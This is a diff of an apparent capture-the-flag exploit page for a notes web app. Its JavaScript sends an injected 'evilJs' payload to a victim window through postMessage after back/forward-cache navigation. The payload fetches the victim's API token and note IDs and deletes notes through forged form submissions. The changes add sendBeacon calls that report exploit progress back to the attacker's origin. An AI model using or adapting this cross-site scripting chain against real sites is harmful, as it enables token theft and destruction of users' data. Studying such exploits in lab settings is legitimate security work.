@@ -1,7 +1,7 @@
 <body>
   <script>
     const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));
-
+    navigator.sendBeacon(location.origin, "start");
     const deleteNote = (url, noteId) => {
       const form = document.createElement("form");
       form.action = url;
@@ -19,6 +19,7 @@
 
     const evilJs = `
       (async () => {
+        navigator.sendBeacon("${location.origin}", "bf XSS success!");
         const { token } = await (await fetch("/api/token")).json();
 
         const noteIds = await (
@@ -72,11 +73,12 @@
         //   ref. https://web.dev/i18n/en/bfcache/#avoid-windowopener-references
         evilWindow.location = `${location.origin}/back.html?n=2`;
       }
-      await sleep(1000);
+      await sleep(1600);
       {
         // Send a JavaScript code via postMessage
         // Then, the XSS window will execute it!
         evilWindow.postMessage(evilJs, baseUrl);
+        navigator.sendBeacon(location.origin, "sended");
       }
     };
     main();
